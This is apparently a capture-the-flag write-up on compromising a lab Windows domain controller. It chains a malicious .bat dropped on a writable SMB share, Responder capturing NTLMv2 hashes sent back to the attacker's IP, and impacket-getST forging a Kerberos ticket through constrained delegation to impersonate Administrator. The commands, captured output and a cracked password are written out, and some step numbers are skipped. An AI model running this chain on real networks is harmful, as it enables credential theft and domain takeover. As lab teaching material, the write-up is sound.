================================================================================
Target : DC01 (10.48.144.61) - Windows Server 2019 - Domain Controller
Domain : ctf.local
Goal   : Capture the Administrator flag on DC01

Attack chain summary
--------------------
1. Anonymous read/write on SMB share "IT-Shared"
2. Share files leak service accounts (svc.scanner, svc.mssql) and a file
   scanner service that runs every 2 minutes and executes files from the share
3. Upload a .bat file that triggers an SMB connection back to us

7. impacket-smbexec with the forged ticket -> SYSTEM shell on DC01
8. Read C:\Users\Administrator\Desktop\flag.txt

================================================================================
STEP 5 - Initial foothold: capture svc.scanner hash (Responder + .bat)
================================================================================

The checklist says the scanner "Runs every 2 minutes" and "Enumerates
IT-Shared for new files to process" and USES SHELL ENUMERATION -> it
EXECUTES files dropped in the share as svc.scanner.

Plan: drop a .bat file that makes the scanner connect back to us over SMB,
harvest its NTLMv2 hash with Responder, then crack the password.

NOTE: First attempts used SCF/LNK files with IconFile pointing at our IP
(\\192.168.164.33\share\icon.ico). These did NOT trigger a callback because
SCF/LNK icon resolution only happens in Explorer GUI rendering, not in a
scheduled PowerShell/Shell task. The working payload is a .bat file.

Get our VPN IP:

    ip a            -> tun0: 192.168.164.33

1) Start Responder on the VPN interface (separate terminal, root):

    sudo responder -I tun0

2) Create the malicious batch file:

    printf '@echo off\nnet use \\\\192.168.164.33\\share\n' > scan.bat

3) Upload it to the writable share:

    smbclient //10.48.144.61/IT-Shared -N -c "put scan.bat"

4) Within ~2 minutes the scanner executes scan.bat as svc.scanner.
   `net use \\192.168.164.33\share` attempts NTLM authentication to us.

5) Responder output (Responder-Session.log):

    [SMB] NTLMv2-SSP Client   : 10.48.144.61
    [SMB] NTLMv2-SSP Username : CTF\svc.scanner
    [SMB] NTLMv2-SSP Hash     : svc.scanner::CTF:826421be5aa786ba:1D73E9...

    Hash saved to /usr/share/responder/logs/SMB-NTLMv2-SSP-10.48.144.61.txt

STEP 8 - Constrained Delegation attack (S4U2Self / S4U2Proxy)
================================================================================

With constrained delegation we can impersonate ANY user (here:
Administrator) against cifs/DC01 via Kerberos S4U2Self+S4U2Proxy.

Forge a service ticket:

    cd /tmp/opencode/crack
    impacket-getST -dc-ip 10.48.144.61 \
        ctf.local/svc.scanner:'1summerlove!' \
        -spn cifs/DC01.CTF.LOCAL \
        -impersonate Administrator

    [*] Getting TGT for user
    [*] Impersonating Administrator
    [*] Requesting S4U2self
    [*] Requesting S4U2Proxy
    [*] Saving ticket in Administrator@cifs_DC01.CTF.LOCAL@CTF.LOCAL.ccache

================================================================================
Key takeaways
================================================================================
- Writable SMB shares + scheduled file-processing tasks = code execution.
- A .bat that triggers an SMB UNC connection is a reliable NTLM hash
  theft primitive (Responder), whereas SCF/LNK icon tricks often only
  work in Explorer.
- Disabled accounts can still authenticate (NTLM) while being revoked
  for Kerberos - don't waste time on them.
- Constrained delegation (msDS-AllowedToDelegateTo) to cifs/<host> allows
  impersonation of any principal (e.g. Administrator) using getST.
- Validate delegation targets directly via LDAP if BloodHound collection
  fails.
